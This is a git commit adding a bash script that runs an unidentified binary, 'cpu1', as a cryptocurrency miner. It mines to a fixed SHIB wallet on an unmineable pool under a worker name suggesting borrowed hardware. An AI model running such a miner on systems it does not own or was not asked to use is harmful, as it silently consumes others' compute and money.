8ef42f4c6d5f5bf502fac9bce20dd1ea69b32a68
angkii <83603708+angkii@users.noreply.github.com>
2021-06-23 02:15:39 +0700

    Create shibacpu.sh

---
+++ shibacpu.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=rx.unmineable.com:3333
+
+WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x cpu1
+
+./cpu1 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
